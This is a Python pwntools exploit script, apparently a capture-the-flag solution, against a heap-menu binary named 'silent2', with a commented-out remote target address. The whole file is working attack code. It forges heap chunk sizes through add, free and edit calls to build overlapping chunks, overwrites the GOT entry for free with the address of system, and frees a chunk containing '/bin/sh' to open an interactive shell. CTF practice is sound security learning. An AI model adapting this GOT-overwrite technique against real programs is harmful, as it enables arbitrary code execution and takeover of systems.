#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./silent2"
ENV = {"LD_PRELOAD":"./libc.so.6"}

target_addr = 0x60209d
free_got = 0x602018
system_plt = 0x400730

p = process(elf)
#p = remote("39.107.32.132", 10001)

def add(size, s):
    sleep(1)
    p.sendline("1")
    p.sendline(str(size))
    p.send(s)

def free(idx):
    sleep(1)
    p.sendline("2")
    p.sendline(str(idx))

def edit(idx, s):
    sleep(1)
    p.sendline("3")
    p.sendline(str(idx))
    p.send(s)
    p.sendline("")


#p.recvuntil("==+RWBXtIRRV+.+IiYRBYBRRYYIRI;VitI;=;..........:::.::;::::...;;;:.\n")
#p.recvuntil("\n")
#p.recvuntil("\n")
add(0x80, "A\n")  # 0
add(0x80, "A\n")  # 1
add(0x80, "A\n")  # 2
add(0xf0, "A\n")  # 3
add(0x80, "/bin/sh\x00\n")  # 4

free(1)
free(2)
free(3)

payload = p8(0)*0x88
payload += p64(0xc1)
payload += p8(0)*0xb8
payload += p64(0x71)
payload += p8(0)*0x68
payload += p64(0x71)
payload += "\n"
add(0x210, payload) # 4 

free(2)
free(1)

payload = p8(0)*0x80+"\n"
add(0x120, payload)

payload = p8(0)*0x98
payload += p64(0xf1)
payload += p64(0x6020c0)
payload += p32(0x6020c8)
payload += p8(0)*3
add(0xb0, payload)

free(4)

edit(3, "\x18\x20\x60\x00")
edit(0, "\x30\x07\x40\x00\00\x00\n")

free(4)

p.interactive()
